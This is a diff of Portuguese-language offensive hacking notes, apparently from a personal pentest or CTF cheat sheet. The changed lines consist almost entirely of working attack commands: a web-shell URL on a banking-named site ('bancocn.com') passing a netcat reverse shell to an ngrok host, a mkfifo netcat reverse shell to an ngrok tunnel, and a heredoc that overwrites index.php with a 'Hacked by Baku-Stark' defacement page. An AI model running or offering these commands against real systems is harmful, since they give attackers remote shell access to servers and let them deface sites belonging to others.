@@ -677,7 +677,7 @@ Se a sua versão do `netcat` não suporta a opção `-e`, você pode usar `mkfif
 
 No servidor (ouvinte):
 ```bash
-nc -lvp 4444
+nc -lvp 789 + ngrok tcp 789
 ```
 
 No cliente (máquina alvo):
@@ -694,11 +694,11 @@ Resultado do comando (+ngrok):
 ```bash
 ubuntu 18
 
-http://www.bancocn.com/admin/uploads/shellphp.php7?cmd=nc%200.tcp.ngrok.io%2015333%20-e%20/bin/bash
+http://www.bancocn.com/admin/uploads/shellphp.php7?cmd=nc 0.tcp.sa.ngrok.io 15303 -e /bin/bash
 ```
 
 ```bash
-mkfifo /tmp/fifo && nc 0.tcp.ngrok.io 15333 < /tmp/fifo | /bin/bash > /tmp/fifo 2>&1; rm /tmp/fifo
+mkfifo /tmp/fifo && nc 0.tcp.sa.ngrok.io 12622 < /tmp/fifo | /bin/bash > /tmp/fifo 2>&1; rm /tmp/fifo
 ```
 
 Shell Reverse (Python)
@@ -714,5 +714,68 @@ Html ( [HTML Compressor](https://codebeautify.org/html-compressor) )
 
 Inserindo `html` no arquivo index:
 ```bash
-printf "<?php echo '<html><head><title>Hacked by Baku-Stark</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}body{width:100%;height:100vh;display:flex;align-items:center;justify-content:center;background-color:#e1dbdf}div.main-container{text-align:center}h1,p{color:#111;margin-bottom:5vh}p{font-size:2.5rem}p a{font-weight:700;text-decoration:none;animation:purplehollow .5s ease-in-out infinite;font-family:'Gill Sans','Gill Sans MT',Calibri,'Trebuchet MS',sans-serif}@keyframes purplehollow{0%{color:red}25%{color:#0ff}75%{color:purple}}</style></head><body><div class='main-container'><h1>Site hacked!!!</h1><figure><img src='https://media1.tenor.com/m/P-mmEgNIquYAAAAC/gojo-satoru.gif'></figure><div><p><strong>Hacked by</strong>:<a href='https://github.com/Baku-Stark' target='_blank'>Baku-Stark</a></p></div></div></body></html>'; ?>" > ../../index.php
+cat << EOF > index.php
+<?php
+echo '<html>';
+echo '<head>';
+echo '<title>Hacked by Baku-Stark</title>';
+echo '<style>';
+echo '*{';
+echo 'margin: 0;';
+echo 'padding: 0;';
+echo 'box-sizing: border-box;';
+echo 'font-family: "Poppins", sans-serif;';
+echo '}';
+echo 'body{';
+echo 'width: 100%;';
+echo 'height: 100vh;';
+echo 'display: flex;';
+echo 'align-items: center;';
+echo 'justify-content: center;';
+echo 'background-color: #E1DBDF;';
+echo '}';
+echo '';
+echo 'div.main-container{';
+echo 'text-align: center;';
+echo '}';
+echo '';
+echo 'h1, p{';
+echo 'color: #111;';
+echo 'margin-bottom: 5vh;';
+echo '}';
+echo '';
+echo 'p{';
+echo 'font-size: 2.5rem;';
+echo '}';
+echo '';
+echo 'p a{';
+echo 'font-weight: bold;';
+echo 'text-decoration: none;';
+echo 'animation: purplehollow 0.5s ease-in-out infinite;';
+echo 'font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;';
+echo '}';
+echo '';
+echo '@keyframes purplehollow {';
+echo '0%{color: #ff0000;}';
+echo '25%{color: #00ffff;}';
+echo '75%{color: #800080;}';
+echo '}';
+echo '</style>';
+echo '</head>';
+echo '<body>';
+echo '<div class="main-container">';
+echo '<h1>Site hacked!!!</h1>';
+echo '<figure>';
+echo '<img src="https://media1.tenor.com/m/P-mmEgNIquYAAAAC/gojo-satoru.gif" alt="Satoru Gojo">';
+echo '</figure>';
+echo '<div>';
+echo '<p>';
+echo '<strong>Hacked by</strong>: <a href="https://github.com/Baku-Stark" target="_blank">Baku-Stark</a>';
+echo '</p>';
+echo '</div>';
+echo '</div>';
+echo '</body>';
+echo '</html>';
+?>
+EOF 
 ```
